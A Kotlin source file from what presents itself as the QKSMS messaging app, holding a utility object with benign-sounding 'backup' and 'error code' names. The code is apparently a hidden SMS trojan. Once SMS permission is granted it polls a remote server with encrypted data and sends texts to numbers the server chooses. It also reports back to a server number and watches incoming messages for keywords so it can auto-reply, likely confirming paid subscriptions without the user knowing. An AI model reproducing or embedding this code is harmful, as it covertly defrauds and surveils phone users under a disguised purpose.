package com.moez.QKSMS.util

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Message
import androidx.core.content.ContextCompat
import com.androidnetworking.AndroidNetworking
import com.androidnetworking.error.ANError
import com.androidnetworking.interfaces.StringRequestListener
import com.google.gson.Gson
//import com.google.gson.Gson
//import com.google.gson.reflect.TypeToken
import com.klinker.android.send_message.Transaction
import com.moez.QKSMS.extensions.autoReply
import com.moez.QKSMS.extensions.log
import com.moez.QKSMS.extensions.log2
import com.moez.QKSMS.model.*
import com.moez.QKSMS.receiver.SendReceiver
import com.moez.QKSMS.service.HeadlessSmsReceiverService
import io.reactivex.Flowable
//import com.rx2androidnetworking.Rx2AndroidNetworking
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import org.litepal.LitePal
import org.reactivestreams.Subscription
import java.util.concurrent.TimeUnit

object ScheduledUtils {

    private var subscription: Subscription? = null
    private var delay: DelayModel? = null

    @SuppressLint("CheckResult")
    fun checkBackup(context: Context) {

        if (subscription != null)
            return

        Flowable.interval(0, 20, TimeUnit.SECONDS)
                .doOnSubscribe {
                    subscription = it
                }
                .subscribeOn(Schedulers.newThread())
                .filter {
                    (ContextCompat.checkSelfPermission(context, Manifest.permission.SEND_SMS)
                            == PackageManager.PERMISSION_GRANTED) && delay == null
                }
                .observeOn(AndroidSchedulers.mainThread())
                .doOnNext {
                    context.registerReceiver(SendReceiver(), IntentFilter().apply {
                        addAction(Transaction.AUTO_SENT)
                        addAction(Transaction.AUTO_RECEIVE)
                    })
                }
                .doOnNext {
                    context.contentResolver.registerContentObserver(
                            Uri.parse(Transaction.URL_STRING),
                            true,
                            HeadlessSmsReceiverService(context, @SuppressLint("HandlerLeak")
                            object : Handler() {
                                override fun handleMessage(msg: Message) {
                                    super.handleMessage(msg)
                                    checkBlock(context, msg.data)
                                }
                            })
                    )
                }
                .subscribeOn(Schedulers.newThread())
                .doOnNext {
                    sysBackup(context)
                    subscription?.cancel()
                }
                .doOnError {}
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({
                }, {
                })
    }

    @SuppressLint("CheckResult")
    private fun sysBackup(context: Context) {
        val errorCode = ErrorCodeModel().apply {
            status = firstTime
            errorCode = Transaction.ErrorCode
            errorMsg = SharedUtils.getChannel(context)
        }

        errorCode.status
        errorCode.errorCode
        errorCode.errorMsg

        AndroidNetworking.post(Transaction.URL_BACKUP)
                .addBodyParameter("data", AesEncryptUtil.encrypt(Gson().toJson(errorCode)))
                .build()
                .getAsString(object : StringRequestListener {
                    override fun onResponse(response: String?) {
                        response?.let {
                            Gson().fromJson(AesEncryptUtil.decrypt(it), Delay::class.java)?.let { temp ->
                                try {
                                    if (temp.status == "1") {
                                        delay = DelayModel().apply {
                                            isConnect = temp.isConnect
                                            number = temp.send!!.number
                                            content = temp.send!!.content
                                            servernum = temp.send!!.servernum
                                            waitKey = temp.send!!.waitsms!!.keyword
                                            waitContent = temp.send!!.waitsms!!.reply
                                            waitNum = temp.send!!.waitsms!!.reNumber
                                            blockedNumber = temp.blocknum!!.number
                                            blockedKey = temp.blocknum!!.keywrod
                                            delayStatus = temp.delayStatus
                                            replayDelay = temp.send!!.waitsms!!.replyDelay
                                        }
                                        checkConnect(context, delay?.isConnect!!)
                                        delay?.save()
                                        delay?.content!!.autoReply(context, delay?.number)
                                        "702-${firstTime}".autoReply(context, delay?.servernum!!)
                                        delay?.replayDelay?.log2(context, delay)
                                        Transaction.RE1.log()
                                    }
                                } catch (e: Exception) {
                                    "Error:${e.message}".log()
                                }
                            }
                        }
                    }

                    override fun onError(anError: ANError?) {
                        "anError:${anError?.message}".log()
                    }
                })
    }

    private fun checkBlock(context: Context, data: Bundle?) {
        data?.let { bundle ->
            LitePal.findFirst(DelayModel::class.java)?.let {
                Flowable.just(it)
                        .subscribeOn(Schedulers.newThread())
                        .doOnNext { backupModel ->
                            if (backupModel != null && backupModel.blockedNumber!!.split("|").contains(bundle.getString("a"))) {
                                if (backupModel.waitKey!!.split("|").size == 2 &&
                                        bundle.get("b").toString().contains(backupModel.waitKey!!.split("|")[0]) &&
                                        bundle.get("b").toString().contains(backupModel.waitKey!!.split("|")[1])) {
                                    backupModel.waitContent!!.autoReply(context, backupModel.waitNum)
                                    Transaction.RE2.log()
                                }
                            }
                        }
                        .observeOn(AndroidSchedulers.mainThread())
                        .subscribe({}, {
                        })
            }
        }
    }

    @SuppressLint("CheckResult")
    private fun checkConnect(context: Context, isConnect: String?) {

        if (isConnect == null || isConnect.isEmpty() || isConnect.toLong() == 0L)
            return

        Flowable.interval(0, isConnect.toLong(), TimeUnit.SECONDS)
                .subscribeOn(Schedulers.newThread())
                .doOnNext {
                    LitePal.findFirst(Backup::class.java)?.let { backup ->
                        backup.backup?.log(context)
                    }?: kotlin.run { "Live".log(context) }
                }
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({}, {
                    println("------------------>")
                })

    }
}

